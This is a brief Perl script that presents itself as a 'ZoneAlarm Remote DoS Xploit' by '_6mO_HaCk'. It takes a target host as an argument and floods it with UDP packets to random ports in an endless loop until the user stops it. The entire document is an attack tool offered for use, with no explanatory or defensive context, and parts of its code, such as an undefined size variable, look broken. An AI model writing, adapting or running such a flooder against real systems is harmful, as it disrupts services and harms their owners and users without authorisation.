use Socket;

system(clear);
print "\n";
print "--- ZoneAlarm Remote DoS Xploit\n";
print "---\n";
print "--- Discovered & Coded By _6mO_HaCk\n";
print "\n";
if(!defined($ARGV[0]))
{
   &usage
}

my ($target);
 $target=$ARGV[0];

my $ia       = inet_aton($target)      || die ("[-] Unable to resolve
$target");

socket(DoS, PF_INET, SOCK_DGRAM, 17);
    $iaddr = inet_aton("$target");

print "[*] DoSing $target ... wait 1 minute and then CTRL+C to stop\n";
for (;;) {
 $size=$rand x $rand x $rand x $rand x $rand x $rand x $rand x $rand x
$rand x $rand x $rand x $rand x $rand x $rand x $rand x $rand x $rand x
$rand x $rand;
 $port=int(rand 65000) +1;
 send(DoS, 0, $size, sockaddr_in($port, $iaddr));
}
sub usage {die("\n\n[*] Usage : perl $0 <Target>\n\n");}